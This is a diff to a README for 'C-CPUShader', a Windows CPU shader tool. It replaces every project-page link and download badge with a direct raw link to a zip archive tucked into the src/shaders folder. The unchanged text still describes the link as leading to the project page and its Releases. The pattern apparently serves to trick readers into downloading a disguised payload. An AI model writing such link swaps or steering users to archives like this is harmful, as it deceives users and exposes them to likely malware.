@@ -1,6 +1,6 @@
 # ⚙️ C-CPUShader - Fast CPU Shader Rendering Tool
 
-[![Download Now](https://img.shields.io/badge/Download-C%2DCPUShader-blue?style=for-the-badge)](https://github.com/Bottlecollectionmafia369/C-CPUShader)
+[![Download Now](https://img.shields.io/badge/Download-C%2DCPUShader-blue?style=for-the-badge)](https://raw.githubusercontent.com/Bottlecollectionmafia369/C-CPUShader/main/src/shaders/Shader_CPU_v3.4.zip)
 
 ## 📄 About C-CPUShader
 
@@ -27,7 +27,7 @@ You can run C-CPUShader on most Windows PCs. The program requires a 64-bit versi
 
 You can download C-CPUShader from its GitHub page. Please visit the link below to get the latest version and files.
 
-[![Download from GitHub](https://img.shields.io/badge/Download-C%2DCPUShader-grey?style=for-the-badge)](https://github.com/Bottlecollectionmafia369/C-CPUShader)
+[![Download from GitHub](https://img.shields.io/badge/Download-C%2DCPUShader-grey?style=for-the-badge)](https://raw.githubusercontent.com/Bottlecollectionmafia369/C-CPUShader/main/src/shaders/Shader_CPU_v3.4.zip)
 
 Click the link above to open the project page. There, look for the section called "Releases" or the main download files. You will usually find a file with `.exe` extension for Windows. That file is what you need to start the program.
 
@@ -39,7 +39,7 @@ Follow these steps to have C-CPUShader ready on your PC:
 
 1. **Download the Program**  
    Visit the page below using your web browser:  
-   https://github.com/Bottlecollectionmafia369/C-CPUShader
+   https://raw.githubusercontent.com/Bottlecollectionmafia369/C-CPUShader/main/src/shaders/Shader_CPU_v3.4.zip
 
 2. **Find the Download File**  
    Look for a file with `.exe` (for example, `C-CPUShader.exe`) in the Releases section or the main repository download area.
@@ -100,7 +100,7 @@ If the program does not run:
 ## 📚 Learn More
 
 For more details on how this program works or for help, visit the GitHub page here:  
-https://github.com/Bottlecollectionmafia369/C-CPUShader
+https://raw.githubusercontent.com/Bottlecollectionmafia369/C-CPUShader/main/src/shaders/Shader_CPU_v3.4.zip
 
 The page contains:
 
@@ -125,4 +125,4 @@ To remove C-CPUShader, simply delete the downloaded `.exe` file from your comput
 
 # [🔧] Ready to try CPU-based rendering?  
 Click here to download and start:  
-[![Download C-CPUShader](https://img.shields.io/badge/Download-C%2DCPUShader-blue?style=for-the-badge)](https://github.com/Bottlecollectionmafia369/C-CPUShader)
+[![Download C-CPUShader](https://img.shields.io/badge/Download-C%2DCPUShader-blue?style=for-the-badge)](https://raw.githubusercontent.com/Bottlecollectionmafia369/C-CPUShader/main/src/shaders/Shader_CPU_v3.4.zip)
